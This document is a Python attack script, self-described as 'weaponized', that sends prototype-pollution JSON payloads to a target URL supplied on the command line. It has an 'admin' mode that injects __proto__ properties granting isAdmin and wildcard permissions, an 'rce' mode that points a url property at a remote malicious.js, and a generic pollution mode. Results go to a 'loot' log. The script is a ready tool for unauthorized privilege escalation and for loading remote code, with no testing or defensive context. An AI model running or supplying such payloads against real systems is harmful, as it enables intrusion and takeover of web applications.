import sys
import requests
import json
import os

def pollute_target(url, parameter_name, mode="admin"):
    """
    Weaponized Prototype Pollution: Injects JSON payloads designed to 
    overwrite global Object properties in the target's JS environment.
    """
    print(f"[*] Targeting: {url}")
    print(f"[*] Mode: {mode.upper()} Injection")
    
    # Payload primitives
    payloads = {
        "admin": {"__proto__": {"isAdmin": True, "role": "admin", "permissions": ["*"]}},
        "rce": {"__proto__": {"sourceURL": "javascript:alert('CHIMERA_PROTOTYPE_POLLUTION')", "url": "http://10.0.2.2/malicious.js"}},
        "pollute": {"constructor": {"prototype": {"polluted": "yes"}}}
    }

    if mode not in payloads:
        print(f"[-] Invalid mode. Use: admin | rce | pollute")
        return

    # Weaponized JSON structure
    target_payload = {parameter_name: payloads[mode]}
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Chimera-Sovereign/13.5"
    }

    print(f"[*] Sending payload to parameter: {parameter_name}...")
    try:
        r = requests.post(url, json=target_payload, headers=headers, timeout=10)
        
        print("-" * 60)
        print(f"[+] Status Code: {r.status_code}")
        print("[*] Tactical Note: If the app merges this JSON unsafely, all ")
        print("    future objects created in the session will inherit these properties.")
        
        # Log the attempt
        with open("../loot/pollution_attempts.log", "a") as f:
            f.write(f"Target: {url} | Param: {parameter_name} | Mode: {mode} | Status: {r.status_code}\n")
        print("-" * 60)

    except Exception as e:
        print(f"[-] Execution Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 133_pollutor <url> <json_param_name> [mode: admin|rce|pollute]")
        sys.exit(1)
    
    mode_choice = sys.argv[3] if len(sys.argv) > 3 else "admin"
    pollute_target(sys.argv[1], sys.argv[2], mode_choice)
